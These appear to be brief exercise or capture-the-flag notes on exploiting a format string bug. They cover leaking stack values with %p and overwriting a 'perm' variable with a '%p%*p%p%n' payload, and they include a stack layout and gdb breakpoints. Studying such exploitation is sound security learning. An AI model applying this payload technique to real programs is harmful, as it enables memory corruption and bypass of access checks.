1. Notice that input string is directly used in printf, so `%p` would be parsed as printf, and stack will be popped to try and get the pointer
2. In order to trigger the ocde we want, we need to modify the value stored at `perm` to > 0, using `%n`
3. modifying `fst.c` we see that `perm` is 32 bytes away
4. using `%*s` we can add an extra parameter to bypass the character limit. since the extra length parameter needs to be kept small so as to not write too large a value to the secret txt, we place it in the second position: `%p%*p%p%n` since values are:
```
0x7fffffffe910: [%p]
0x7fffffffe908: [%s/p] -->\0\0\0\0 [%s] prefix, 8 bytes
0x7fffffffe900: [%s/p] %s%LG%p\0  prefix_format, 8 bytes
0x7fffffffe8f8: [%p]   0x5555555594c0 -> 0/null
0x7fffffffe8f0: [%p]   0x5555555592a0 -> &fp 
0x7fffffffe8e8: perm
```
breakpoints:
`break 64`
`break fprintf`
`break 65`
`x/24x 0x7fffffffe8e8`
`info frame`
`x/24x $sp`